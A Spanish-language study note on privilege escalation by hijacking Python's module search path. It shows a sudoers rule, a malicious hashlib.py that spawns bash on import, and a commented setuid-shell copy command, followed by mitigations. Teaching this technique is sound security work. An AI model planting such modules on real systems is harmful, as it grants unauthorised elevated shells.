---
Tema: "[[Escalada de Privilegios]]"
Herramientas: "[[locate]]"
---
# 🔐 Explotación de Rutas de Importación en Python 

---

## 📚 Teoría

La vulnerabilidad que exploraremos se basa en cómo Python maneja la importación de módulos a través del `sys.path`. Cuando Python busca un módulo para importar, lo hace siguiendo un orden específico de directorios definidos en esta lista.

> [!info] ¿Qué es sys.path?
> `sys.path` es una lista de directorios que Python busca cuando importa un módulo. El primer elemento (`''`) representa el directorio actual donde se ejecuta el script.

La prioridad de búsqueda es crucial: Python importará el primer módulo que encuentre con el nombre solicitado. Si podemos escribir en alguno de los directorios al inicio de esta lista, podemos hacer que Python cargue nuestro módulo malicioso en lugar del legítimo.

**Esto es particularmente peligroso cuando:**
- Se ejecutan scripts con privilegios elevados
- Se utilizan permisos de `sudo` para ejecutar código Python
- No se valida adecuadamente el entorno de ejecución

---

## 💻 Práctica

### Contexto
Tenemos dos usuarios en el sistema:
- `liskov` (usuario con más privilegios)
- `n1krov` (nuestro usuario)

### Configuración de Sudo

En el archivo `/etc/sudoers` se ha establecido que podemos ejecutar un script Python específico como el usuario `liskov`:

```sh
n1krov ALL=(liskov) NOPASSWD: /usr/bin/python3 /tmp/ejemplo.py
```

### Script Original (creado por liskov)

```python
import hashlib
if __name__=='__main__':
	cadena="hola esta es una cadena"
	print(hashlib.md5(cadena.encode()).hexdigest())
```

### Analizando la Vulnerabilidad

El problema radica en cómo Python busca módulos para importarlos. Examinemos el `sys.path`:

```bash
python -c 'import sys; print(sys.path)'
```

Esto nos muestra:
```
['', '/usr/lib/python313.zip', '/usr/lib/python3.13', '/usr/lib/python3.13/lib-dynload', '/usr/lib/python3.13/site-packages']
```

> [!warning] Punto Vulnerable
> El primer elemento `''` representa el directorio actual desde donde se ejecuta el script. Si tenemos acceso de escritura a este directorio, podemos colocar nuestros propios módulos que serán importados antes que los del sistema.

### Localizando el Módulo Original

Primero, verifiquemos dónde está ubicado el módulo `hashlib` legítimo:

```bash
locate hashlib
```

Resultado: `/usr/lib/python3.13/hashlib.py`

Esto confirma que el módulo legítimo está en una de las rutas del `sys.path`, pero no en la primera posición.

### Explotando la Vulnerabilidad

Creamos nuestro propio módulo malicioso llamado `hashlib.py` y lo colocamos en `/tmp/`:

```python
import os
if __name__=='__main__':
	# para tener una shell
	# os.system("cp /bin/sh /tmp/sh; chmod +xs /tmp/sh")
	os.system("bash")
```

### Explicación de la Explotación

1. Cuando ejecutamos `sudo -u liskov /usr/bin/python3 /tmp/ejemplo.py`:
2. Python busca el módulo `hashlib` siguiendo el orden de `sys.path`
3. El directorio actual es `/tmp/`, donde está nuestro `hashlib.py` malicioso
4. Python importa nuestro módulo en lugar del legítimo
5. Aunque nuestro código no se ejecuta directamente en la importación, podemos modificarlo para que sí lo haga:

> [!example] Versión mejorada del exploit
> ```python
> import os
> 
> # Este código se ejecuta al importar el módulo
> os.system("bash")
> 
> if __name__=='__main__':
> 	pass
> ```

---

## 🛡️ Mitigaciones

Para prevenir este tipo de ataques:

1. No ejecutar scripts Python con privilegios elevados en directorios con permisos de escritura para usuarios no confiables
2. Utilizar entornos virtuales aislados
3. Establecer explícitamente `PYTHONPATH` antes de ejecutar scripts sensibles
4. Considerar el uso de módulos como `importlib` con rutas absolutas

>[!tip] Consejo de Seguridad
>Siempre verifica la integridad del entorno antes de ejecutar código con privilegios elevados.

---